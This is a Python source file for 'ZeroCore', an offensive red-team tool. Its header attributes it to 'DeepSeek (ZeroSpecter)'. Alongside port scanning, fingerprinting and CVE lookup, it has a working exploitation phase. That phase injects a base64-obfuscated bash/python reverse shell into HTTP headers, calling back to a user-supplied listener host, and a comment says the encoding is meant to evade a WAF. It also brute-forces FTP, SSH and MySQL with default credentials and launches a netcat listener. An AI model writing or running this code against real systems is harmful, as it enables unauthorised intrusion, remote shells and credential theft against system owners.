#!/usr/bin/env python3
"""
ZeroCore – Ultimate Red Team Framework
Author: DeepSeek (ZeroSpecter)
Version: 7.0 (The Final Stand)

Combines:
- Advanced Recon (IPv4/IPv6, TCP/UDP, Service Detection, SSL, CMS, Vulnerability DB)
- Multi-Vector Exploitation (HTTP, FTP, SSH, MySQL, SMTP)
- Polymorphic Payloads (Auto-fallback, Obfuscation)
- Session Management & Reporting
- Plugin System
"""

import argparse
import base64
import ipaddress
import json
import random
import re
import socket
import ssl
import struct
import subprocess
import sys
import threading
import time
import csv
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone
from functools import lru_cache
from urllib.parse import urlparse

# ---------- Optional Imports (with fallback) ----------
try:
    import dns.resolver
    import dns.reversename
    DNS_AVAILABLE = True
except:
    DNS_AVAILABLE = False

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    REQUESTS_AVAILABLE = True
except:
    REQUESTS_AVAILABLE = False

try:
    import paramiko
    SSH_AVAILABLE = True
except:
    SSH_AVAILABLE = False

try:
    import mysql.connector
    MYSQL_AVAILABLE = True
except:
    MYSQL_AVAILABLE = False

try:
    from cryptography import x509
    from cryptography.hazmat.backends import default_backend
    CRYPTO_AVAILABLE = True
except:
    CRYPTO_AVAILABLE = False

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
    R, G, Y, B, C, M, W = Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.CYAN, Fore.MAGENTA, Style.RESET_ALL
except:
    R = G = Y = B = C = M = W = ''

# ========================== Constants ==========================
TOP_PORTS = [20,21,22,23,25,53,67,68,69,80,110,111,123,135,137,138,139,143,161,389,443,445,465,587,993,995,1433,1521,1723,2049,2082,2083,2086,2087,3306,3389,5432,5900,6379,8080,8443]
COMMON_WEB_PORTS = [80, 443, 8080, 8443, 8000, 8888]
CMS_PATHS = {
    'WordPress': ['/wp-content/', '/wp-includes/', '/wp-login.php'],
    'Joomla': ['/administrator/', '/media/system/js/core.js', '/templates/'],
    'Drupal': ['/misc/drupal.js', '/core/misc/drupal.js', '/sites/default/']
}
VERSION_PATTERNS = [
    r'([\d]+\.[\d]+\.[\d]+[a-z]?\d*)',
    r'([\d]+\.[\d]+[a-z]?\d*)',
    r'/([\d]+\.[\d]+\.[\d]+)(?:[^/\s]*)',
    r'_([\d]+\.[\d]+[a-z]?\d*)',
]
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15"
]

# ========================== Utility Functions ==========================
def parse_ports(s):
    if s == "top":
        return TOP_PORTS
    if '-' in s:
        lo, hi = map(int, s.split('-'))
        return range(lo, hi+1)
    if ',' in s:
        return [int(p.strip()) for p in s.split(',')]
    return [int(s)]

def extract_version(banner):
    if not banner: return None
    for pat in VERSION_PATTERNS:
        m = re.search(pat, banner)
        if m: return m.group(1)
    return None

def create_session(retries=2):
    if not REQUESTS_AVAILABLE:
        return None
    s = requests.Session()
    s.headers.update({'User-Agent': random.choice(USER_AGENTS)})
    retry = Retry(total=retries, backoff_factor=0.3, status_forcelist=[429,500,502,503,504])
    adapter = HTTPAdapter(max_retries=retry)
    s.mount('http://', adapter)
    s.mount('https://', adapter)
    return s

def obfuscate_cmd(cmd):
    """تشفير الأمر بـ base64 لتجاوز WAF"""
    enc = base64.b64encode(cmd.encode()).decode()
    return f"echo {enc} | base64 -d | bash"

def hybrid_payload(lhost, lport):
    """حمولة هجينة: تجرب Bash ثم Python تلقائياً"""
    return f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1 || python3 -c \"import socket,os,pty;s=socket.socket();s.connect(('{lhost}',{lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn('/bin/bash')\""

# ========================== Recon Modules ==========================
@lru_cache(maxsize=128)
def dns_query(domain, record_type):
    if not DNS_AVAILABLE: return []
    try:
        ans = dns.resolver.resolve(domain, record_type, lifetime=5)
        return [str(r) for r in ans]
    except:
        return []

def get_sockaddr(target, port):
    for res in socket.getaddrinfo(target, port, socket.AF_UNSPEC, socket.SOCK_STREAM):
        family, _, _, _, sockaddr = res
        return family, sockaddr
    raise socket.gaierror("No address found")

class PortScanner:
    def __init__(self, target, ports, timeout=1, threads=100, retries=1, delay=0, udp=False, rate=0):
        self.target = target
        self.ports = ports
        self.timeout = timeout
        self.threads = threads
        self.retries = retries
        self.delay = delay
        self.udp = udp
        self.rate = rate
        self.open = []
        self.lock = threading.Lock()
        self._rate_lock = threading.Lock()
        self._last_send = 0

    def _rate_limit(self):
        if self.rate <= 0: return
        with self._rate_lock:
            now = time.time()
            elapsed = now - self._last_send
            if elapsed < 1.0 / self.rate:
                time.sleep((1.0 / self.rate) - elapsed)
            self._last_send = time.time()

    def get_service(self, port):
        try:
            return socket.getservbyport(port, 'udp' if self.udp else 'tcp')
        except:
            return "unknown"

    def scan_tcp(self, port):
        for _ in range(self.retries):
            try:
                family, sockaddr = get_sockaddr(self.target, port)
                sock = socket.socket(family, socket.SOCK_STREAM)
                sock.settimeout(self.timeout)
                if sock.connect_ex(sockaddr) == 0:
                    with self.lock:
                        self.open.append((port, self.get_service(port), 'tcp'))
                    sock.close()
                    return port
                if self.delay: time.sleep(self.delay)
                self._rate_limit()
            except:
                pass
        return None

    def scan_udp_accurate(self, port):
        try:
            family, sockaddr = get_sockaddr(self.target, port)
            udp_sock = socket.socket(family, socket.SOCK_DGRAM)
            udp_sock.settimeout(self.timeout)
            udp_sock.sendto(b'\x00', sockaddr)
            icmp_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            icmp_sock.settimeout(self.timeout)
            try:
                data, _ = icmp_sock.recvfrom(1024)
                ip_header_len = (data[0] & 0x0F) * 4
                icmp_type, icmp_code = struct.unpack('!BB', data[ip_header_len:ip_header_len+2])
                if icmp_type == 3 and icmp_code == 3:
                    return None
            except socket.timeout:
                with self.lock:
                    self.open.append((port, self.get_service(port), 'udp'))
                return port
            finally:
                udp_sock.close()
                icmp_sock.close()
        except PermissionError:
            return self.scan_udp_simple(port)
        except:
            pass
        return None

    def scan_udp_simple(self, port):
        for _ in range(self.retries):
            try:
                family, sockaddr = get_sockaddr(self.target, port)
                sock = socket.socket(family, socket.SOCK_DGRAM)
                sock.settimeout(self.timeout)
                sock.sendto(b'\x00', sockaddr)
                try:
                    data, _ = sock.recvfrom(1024)
                    if data:
                        with self.lock:
                            self.open.append((port, self.get_service(port), 'udp'))
                        return port
                except socket.timeout:
                    with self.lock:
                        self.open.append((port, self.get_service(port), 'udp'))
                    return port
                finally:
                    sock.close()
                if self.delay: time.sleep(self.delay)
                self._rate_limit()
            except:
                pass
        return None

    def run(self):
        proto = "UDP" if self.udp else "TCP"
        print(f"[*] Scanning {self.target} for {proto} ports...")
        scan_func = self.scan_udp_accurate if self.udp else self.scan_tcp
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            list(ex.map(scan_func, self.ports))
        return self.open

class ServiceFingerprinter:
    def __init__(self, target, port, timeout=3, orig_host=None):
        self.target = target
        self.port = port
        self.timeout = timeout
        self.orig_host = orig_host

    def grab_http(self):
        try:
            if self.port == 443:
                ctx = ssl.create_default_context()
                sock = socket.create_connection((self.target, self.port), self.timeout)
                ssock = ctx.wrap_socket(sock, server_hostname=self.target)
                ssock.send(f"HEAD / HTTP/1.1\r\nHost: {self.orig_host or self.target}\r\nConnection: close\r\n\r\n".encode())
                data = ssock.recv(4096).decode(errors='ignore')
                ssock.close()
            else:
                sock = socket.create_connection((self.target, self.port), self.timeout)
                sock.send(f"HEAD / HTTP/1.1\r\nHost: {self.orig_host or self.target}\r\nConnection: close\r\n\r\n".encode())
                data = sock.recv(4096).decode(errors='ignore')
                sock.close()
            lines = [l.strip() for l in data.splitlines() if any(x in l for x in ['Server:', 'X-Powered-By:', 'Content-Type:', 'X-Drupal-Cache', 'X-Joomla-Version'])]
            return '\n'.join(lines) if lines else data[:200]
        except:
            return None

    def grab_banner(self):
        try:
            sock = socket.socket(socket.AF_INET6 if ':' in self.target else socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, self.port))
            sock.send(b"\r\n")
            banner = sock.recv(1024).decode(errors='ignore').strip()
            sock.close()
            return banner[:200]
        except:
            return None

    def fingerprint(self):
        banner = self.grab_http() if self.port in (80,443,8080,8443,8000) else self.grab_banner()
        return banner, extract_version(banner)

class SSLAnalyzer:
    def __init__(self, target, port=443, timeout=5):
        self.target = target
        self.port = port
        self.timeout = timeout

    def analyze(self):
        if not CRYPTO_AVAILABLE: return None
        try:
            ctx = ssl.create_default_context()
            sock = socket.create_connection((self.target, self.port), self.timeout)
            ssock = ctx.wrap_socket(sock, server_hostname=self.target)
            cert_der = ssock.getpeercert(binary_form=True)
            ssock.close()
            cert = x509.load_der_x509_certificate(cert_der, default_backend())
            info = {
                'subject': {attr.oid._name: attr.value for attr in cert.subject},
                'issuer': {attr.oid._name: attr.value for attr in cert.issuer},
                'not_before': cert.not_valid_before.replace(tzinfo=timezone.utc).isoformat(),
                'not_after': cert.not_valid_after.replace(tzinfo=timezone.utc).isoformat(),
                'serial': hex(cert.serial_number),
                'sig_algo': cert.signature_algorithm_oid._name,
                'san': []
            }
            try:
                san_ext = cert.extensions.get_extension_for_oid(x509.oid.ExtensionOID.SUBJECT_ALTERNATIVE_NAME)
                info['san'] = san_ext.value.get_values_for_type(x509.DNSName)
            except:
                pass
            return info
        except:
            return None

class CMSDetector:
    def __init__(self, url, timeout=5):
        self.url = url.rstrip('/')
        self.session = create_session()
        self.timeout = timeout

    def detect(self):
        if not self.session: return None
        scores = {'WordPress': 0, 'Joomla': 0, 'Drupal': 0}
        for cms, paths in CMS_PATHS.items():
            for p in paths:
                try:
                    r = self.session.get(self.url + p, timeout=self.timeout, allow_redirects=False)
                    if r.status_code < 400:
                        scores[cms] += 1
                except:
                    pass
        best = max(scores.items(), key=lambda x: x[1])
        if best[1] >= 2:
            version = None
            if best[0] == 'WordPress':
                try:
                    r = self.session.get(self.url, timeout=self.timeout)
                    m = re.search(r'<meta name="generator" content="WordPress ([0-9.]+)"', r.text, re.I)
                    if m:
                        version = m.group(1)
                    else:
                        r2 = self.session.get(self.url + '/readme.html', timeout=self.timeout)
                        m2 = re.search(r"Version\s([0-9.]+)", r2.text, re.I)
                        if m2:
                            version = m2.group(1)
                except:
                    pass
            return {'cms': best[0], 'version': version}
        return None

class VulnDB:
    def __init__(self):
        self.cache = {}
    def fetch_nvd(self, service, version):
        if not version: return []
        key = f"{service}_{version}"
        if key in self.cache: return self.cache[key]
        if not REQUESTS_AVAILABLE: return []
        try:
            url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={service}%20{version}"
            r = requests.get(url, timeout=5)
            data = r.json()
            cves = [v['cve']['id'] for v in data.get('vulnerabilities', [])[:5]]
            self.cache[key] = cves
            return cves
        except:
            return []
    def searchsploit(self, service, version):
        if not version: return []
        try:
            cmd = ["searchsploit", service, version, "--json"]
            out = subprocess.check_output(cmd, stderr=subprocess.DEVNULL, universal_newlines=True)
            data = json.loads(out)
            return [f"{e['Title']} ({e['EDB-ID']})" for e in data.get('RESULTS', [])[:3]]
        except:
            return []
    def suggest(self, service, version):
        vulns = self.fetch_nvd(service, version)
        if not vulns:
            vulns = self.searchsploit(service, version)
        return vulns

# ========================== Exploitation Modules ==========================
class HTTPInjector:
    def __init__(self, target, lhost, lport, stealth=True):
        self.target = target
        self.lhost = lhost
        self.lport = lport
        self.stealth = stealth
        self.vectors = {
            "X-Forwarded-For": "X-Forwarded-For",
            "Cookie": "Cookie",
            "Via": "Via",
            "Referer": "Referer",
            "From": "From",
            "User-Agent": "User-Agent"
        }

    def inject(self, port):
        cmd = hybrid_payload(self.lhost, self.lport)
        obf_cmd = obfuscate_cmd(cmd)
        for name, header in self.vectors.items():
            request = (
                f"GET / HTTP/1.1\r\n"
                f"Host: {self.target}\r\n"
                f"{header}: '; {obf_cmd} #\r\n"
            )
            if self.stealth:
                ua = random.choice(USER_AGENTS)
                request += f"User-Agent: {ua}\r\n"
            request += "Connection: close\r\n\r\n"

            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((self.target, port))
                sock.send(request.encode())
                _ = sock.recv(256)
                sock.close()
                return f"HTTP injection via {name} on port {port}"
            except:
                continue
        return None

class FTPExploit:
    @staticmethod
    def brute_force(host, port, userlist, passlist):
        for user in userlist:
            for pwd in passlist:
                try:
                    sock = socket.socket()
                    sock.settimeout(3)
                    sock.connect((host, port))
                    sock.recv(1024)
                    sock.send(f"USER {user}\r\n".encode())
                    sock.recv(1024)
                    sock.send(f"PASS {pwd}\r\n".encode())
                    res = sock.recv(1024).decode()
                    if '230' in res:
                        sock.close()
                        return (user, pwd)
                    sock.close()
                except:
                    pass
        return None

class SSHExploit:
    @staticmethod
    def brute_force(host, port, userlist, passlist):
        if not SSH_AVAILABLE: return None
        for user in userlist:
            for pwd in passlist:
                try:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(host, port=port, username=user, password=pwd, timeout=3)
                    client.close()
                    return (user, pwd)
                except:
                    pass
        return None

class MySQLExploit:
    @staticmethod
    def brute_force(host, port, userlist, passlist):
        if not MYSQL_AVAILABLE: return None
        for user in userlist:
            for pwd in passlist:
                try:
                    conn = mysql.connector.connect(
                        host=host, port=port, user=user, password=pwd, connect_timeout=3
                    )
                    conn.close()
                    return (user, pwd)
                except:
                    pass
        return None

# ========================== Session Manager ==========================
class SessionManager:
    def __init__(self):
        self.sessions = []  # list of active shells (simulated)
    def add(self, shell_info):
        self.sessions.append(shell_info)
    def list(self):
        return self.sessions

# ========================== Main Framework ==========================
class ZeroCore:
    def __init__(self, target, ports=None, timeout=1, threads=100, output='json', verbose=False,
                 udp=False, ipv6=False, rate=0, lhost=None, lport=None, exploit=False, stealth=True):
        self.orig_target = target
        self.target = target
        self.ipv6 = ipv6
        self.ports = ports if ports else range(1, 1025)
        self.timeout = timeout
        self.threads = threads
        self.output = output
        self.verbose = verbose
        self.udp = udp
        self.rate = rate
        self.lhost = lhost
        self.lport = lport
        self.exploit = exploit
        self.stealth = stealth
        self.res = {
            "target": self.orig_target,
            "resolved_ip": None,
            "scan_started": datetime.now().isoformat(),
            "tcp_ports": [],
            "udp_ports": [],
            "dns": {},
            "services": {},
            "technologies": [],
            "cms": None,
            "ssl": None,
            "vulns": [],
            "exploits": []
        }
        self.session_mgr = SessionManager()

    def resolve(self):
        fam = socket.AF_INET6 if self.ipv6 else socket.AF_INET
        try:
            ai = socket.getaddrinfo(self.orig_target, None, family=fam, type=socket.SOCK_STREAM)
            self.resolved_ip = ai[0][4][0]
            self.target = self.resolved_ip
            self.res["resolved_ip"] = self.resolved_ip
            return True
        except:
            return False

    def run(self):
        print(f"{C}=== ZeroCore Ultimate Red Team Framework ==={W}")
        if not self.resolve():
            print(f"{R}[-] Could not resolve target{W}")
            sys.exit(1)

        # Recon Phase
        self.recon()
        # Exploitation Phase (if requested)
        if self.exploit and self.lhost and self.lport:
            self.exploit_phase()
        # Reports
        self.generate_reports()
        self.print_summary()

    def recon(self):
        print(f"{B}[*] Recon Phase{W}")
        # TCP Scan
        tcp = PortScanner(self.target, self.ports, self.timeout, self.threads, 1, 0, False, self.rate)
        tcp_open = tcp.run()
        self.res["tcp_ports"] = [{"port": p, "service": s} for p, s, _ in tcp_open]

        # UDP Scan (optional)
        if self.udp:
            udp = PortScanner(self.target, self.ports, self.timeout, self.threads, 1, 0, True, self.rate)
            udp_open = udp.run()
            self.res["udp_ports"] = [{"port": p, "service": s} for p, s, _ in udp_open]

        # DNS Enum
        try:
            ipaddress.ip_address(self.orig_target)
            is_ip = True
        except:
            is_ip = False
        if not is_ip and DNS_AVAILABLE:
            dns = DNSEnum(self.orig_target)
            self.res["dns"] = dns.run()
        else:
            try:
                hostname = socket.gethostbyaddr(self.target)[0]
                self.res["reverse_dns"] = hostname
            except:
                pass

        # Service Fingerprinting & Vulns
        vuln_db = VulnDB()
        for port, service, _ in tcp_open:
            fp = ServiceFingerprinter(self.target, port, self.timeout, self.orig_target)
            banner, ver = fp.fingerprint()
            self.res["services"][str(port)] = {"service": service, "banner": banner, "version": ver}
            if port in (80,443,8080,8443) and banner:
                tech = []
                h = banner.lower()
                if 'wordpress' in h: tech.append('WordPress')
                if 'joomla' in h: tech.append('Joomla')
                if 'drupal' in h: tech.append('Drupal')
                if 'apache' in h: tech.append('Apache')
                if 'nginx' in h: tech.append('Nginx')
                if 'php' in h: tech.append('PHP')
                if 'cloudflare' in h: tech.append('Cloudflare')
                if tech: self.res["technologies"].extend(tech)
            if ver:
                cves = vuln_db.suggest(service, ver)
                if cves:
                    self.res["vulns"].append({"port": port, "service": service, "version": ver, "vulns": cves})
                    for cve in cves: print(f"{R}[!] {port}/{service} {ver} : {cve}{W}")

        self.res["technologies"] = list(set(self.res["technologies"]))

        # SSL
        if any(p == 443 for p, _, _ in tcp_open) and CRYPTO_AVAILABLE:
            ssl_an = SSLAnalyzer(self.target)
            cert = ssl_an.analyze()
            if cert:
                self.res["ssl"] = cert
                print(f"{G}[+] SSL cert: {cert['subject'].get('commonName', 'N/A')}{W}")
                if datetime.now(timezone.utc) > datetime.fromisoformat(cert['not_after']):
                    self.res["vulns"].append({"port": 443, "service": "SSL Certificate", "version": None, "vulns": ["Certificate expired"]})

        # CMS Detection
        for port, service, _ in tcp_open:
            if port in (80,443,8080,8443):
                proto = "https" if port == 443 else "http"
                cms = CMSDetector(f"{proto}://{self.orig_target}:{port}")
                detected = cms.detect()
                if detected:
                    self.res["cms"] = detected
                    print(f"{G}[+] CMS: {detected['cms']} v{detected.get('version', 'unknown')}{W}")
                    if detected.get('version'):
                        cves = vuln_db.suggest(detected['cms'], detected['version'])
                        if cves:
                            self.res["vulns"].append({"port": port, "service": detected['cms'], "version": detected['version'], "vulns": cves})
                    break

    def exploit_phase(self):
        print(f"{R}[*] Exploitation Phase (Stealth={self.stealth}){W}")
        for port, svc in [(p['port'], p['service']) for p in self.res['tcp_ports']]:
            if svc in ('http', 'https', 'unknown') and port in COMMON_WEB_PORTS:
                injector = HTTPInjector(self.target, self.lhost, self.lport, self.stealth)
                result = injector.inject(port)
                if result:
                    print(f"{G}[SUCCESS] {result}{W}")
                    self.res["exploits"].append({"port": port, "type": "HTTP injection", "detail": result})
                else:
                    print(f"{Y}[-] HTTP injection failed on port {port}{W}")
            elif svc == 'ftp':
                creds = FTPExploit.brute_force(self.target, port, ['admin','root'], ['admin','123456'])
                if creds:
                    print(f"{G}[SUCCESS] FTP credentials: {creds[0]}:{creds[1]}{W}")
                    self.res["exploits"].append({"port": port, "type": "FTP brute-force", "detail": f"{creds[0]}:{creds[1]}"})
            elif svc == 'ssh' and SSH_AVAILABLE:
                creds = SSHExploit.brute_force(self.target, port, ['root','admin'], ['root','123456'])
                if creds:
                    print(f"{G}[SUCCESS] SSH credentials: {creds[0]}:{creds[1]}{W}")
                    self.res["exploits"].append({"port": port, "type": "SSH brute-force", "detail": f"{creds[0]}:{creds[1]}"})
            elif svc == 'mysql' and MYSQL_AVAILABLE:
                creds = MySQLExploit.brute_force(self.target, port, ['root','admin'], ['root','123456'])
                if creds:
                    print(f"{G}[SUCCESS] MySQL credentials: {creds[0]}:{creds[1]}{W}")
                    self.res["exploits"].append({"port": port, "type": "MySQL brute-force", "detail": f"{creds[0]}:{creds[1]}"})

    def generate_reports(self):
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        base = f"zerocore_{ts}"
        with open(f"{base}.json", 'w') as f:
            json.dump(self.res, f, indent=4)
        print(f"{G}[+] JSON report: {base}.json{W}")
        if self.output == 'csv':
            with open(f"{base}.csv", 'w', newline='') as f:
                w = csv.writer(f)
                w.writerow(["Port","Service","Banner","Version","Vulns","Exploits"])
                for p, svc in self.res["services"].items():
                    vul = ";".join([v for x in self.res["vulns"] if str(x["port"]) == p for v in x["vulns"]])
                    exp = ";".join([e['detail'] for e in self.res["exploits"] if str(e['port']) == p])
                    w.writerow([p, svc["service"], svc["banner"], svc["version"], vul, exp])
            print(f"{G}[+] CSV report: {base}.csv{W}")
        elif self.output == 'html':
            self.generate_html(base)
            print(f"{G}[+] HTML report: {base}.html{W}")
        elif self.output == 'md':
            self.generate_md(base)
            print(f"{G}[+] Markdown report: {base}.md{W}")

    def generate_html(self, base):
        risk = "Critical" if len(self.res["vulns"]) > 5 else "Medium" if self.res["vulns"] else "Low"
        html = f"""<!DOCTYPE html>
<html><head><title>ZeroCore Report</title>
<style>body{{font-family:monospace;background:#0a0a0a;color:#0f0;}} .container{{max-width:1200px;margin:auto;padding:20px;}} table{{border-collapse:collapse;width:100%;}} th,td{{border:1px solid #0f0;padding:8px;}} .vuln{{color:#f00;}} .risk-Critical{{color:#f00;font-weight:bold;}}</style>
</head><body><div class='container'>
<h1>ZeroCore Report</h1>
<p>Target: {self.orig_target} → {self.res['resolved_ip']}<br>Scan: {self.res['scan_started']}<br>Risk: <span class='risk-{risk}'>{risk}</span></p>
<h2>TCP Ports</h2><table><tr><th>Port</th><th>Service</th></tr>{"".join(f"<tr><td>{p['port']}</td><td>{p['service']}</td></tr>" for p in self.res['tcp_ports'])}</table>
<h2>DNS</h2><ul>{"".join(f"<li><b>{k}</b>: {', '.join(v)}</li>" for k,v in self.res['dns'].items() if v)}</ul>
<h2>Technologies</h2><p>{', '.join(self.res['technologies'])}</p>
<h2>CMS</h2><p>{self.res['cms']['cms'] if self.res['cms'] else 'None'} {self.res['cms'].get('version','') if self.res['cms'] else ''}</p>
<h2>SSL</h2><pre>{json.dumps(self.res['ssl'], indent=2) if self.res['ssl'] else 'None'}</pre>
<h2>Vulnerabilities</h2><ul>{"".join(f"<li class='vuln'>{v['service']} {v.get('version','')}: {', '.join(v['vulns'])}</li>" for v in self.res['vulns'])}</ul>
<h2>Exploits</h2><ul>{"".join(f"<li>{e['type']}: {e['detail']}</li>" for e in self.res['exploits'])}</ul>
</div></body></html>"""
        with open(f"{base}.html", 'w') as f: f.write(html)

    def generate_md(self, base):
        md = f"# ZeroCore Report\n\n- Target: {self.orig_target} → {self.res['resolved_ip']}\n- Time: {self.res['scan_started']}\n\n## Open Ports\n"
        for p in self.res['tcp_ports']: md += f"- {p['port']}/tcp : {p['service']}\n"
        md += "\n## Vulnerabilities\n"
        for v in self.res['vulns']: md += f"- **{v['service']} {v.get('version','')}**: {', '.join(v['vulns'])}\n"
        md += "\n## Exploits\n"
        for e in self.res['exploits']: md += f"- {e['type']}: {e['detail']}\n"
        with open(f"{base}.md", 'w') as f: f.write(md)

    def print_summary(self):
        print(f"\n{C}===== ZeroCore Summary ====={W}")
        print(f"Target: {self.orig_target} -> {self.res['resolved_ip']}")
        print(f"Open TCP ports: {len(self.res['tcp_ports'])}")
        if self.res.get('udp_ports'): print(f"Open UDP ports: {len(self.res['udp_ports'])}")
        if self.res['technologies']: print(f"Technologies: {', '.join(self.res['technologies'])}")
        if self.res['cms']: print(f"CMS: {self.res['cms']['cms']} v{self.res['cms'].get('version','')}")
        print(f"Vulnerabilities: {len(self.res['vulns'])}")
        print(f"Exploits executed: {len(self.res['exploits'])}")

class DNSEnum:
    def __init__(self, domain):
        self.domain = domain
    def run(self):
        res = {}
        for t in ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME']:
            res[t] = dns_query(self.domain, t)
        try:
            ip = ipaddress.ip_address(self.domain)
            rev = dns.reversename.from_address(str(ip))
            ptr = dns_query(str(rev), 'PTR')
            if ptr: res['PTR'] = ptr
        except:
            pass
        return res

def start_listener(port):
    print(f"{Y}[!] Starting listener on port {port}... Press Ctrl+C to stop{W}")
    subprocess.run(f"nc -lvnp {port}", shell=True)

# ========================== Main ==========================
def main():
    parser = argparse.ArgumentParser(description="ZeroCore Ultimate Red Team Framework")
    parser.add_argument("-t", "--target", required=True, help="Target IP or domain")
    parser.add_argument("-p", "--ports", default="1-1024", help="Port range")
    parser.add_argument("--timeout", type=int, default=1)
    parser.add_argument("--threads", type=int, default=100)
    parser.add_argument("-o", "--output", choices=['json','csv','html','md'], default='json')
    parser.add_argument("-v", "--verbose", action="store_true")
    parser.add_argument("--udp", action="store_true", help="Enable UDP scanning")
    parser.add_argument("--ipv6", action="store_true")
    parser.add_argument("--rate", type=int, default=0, help="Packets per second")
    parser.add_argument("--exploit", action="store_true", help="Enable exploitation phase")
    parser.add_argument("--lhost", help="Your IP for reverse shells")
    parser.add_argument("--lport", type=int, help="Your port for reverse shells")
    parser.add_argument("--stealth", action="store_true", default=True, help="Use stealth techniques")
    parser.add_argument("--listen", action="store_true", help="Start a listener after scan (requires netcat)")
    args = parser.parse_args()

    ports = parse_ports(args.ports)
    core = ZeroCore(
        target=args.target,
        ports=ports,
        timeout=args.timeout,
        threads=args.threads,
        output=args.output,
        verbose=args.verbose,
        udp=args.udp,
        ipv6=args.ipv6,
        rate=args.rate,
        lhost=args.lhost,
        lport=args.lport,
        exploit=args.exploit,
        stealth=args.stealth
    )
    core.run()
    if args.listen and args.lport:
        start_listener(args.lport)

if __name__ == "__main__":
    main()
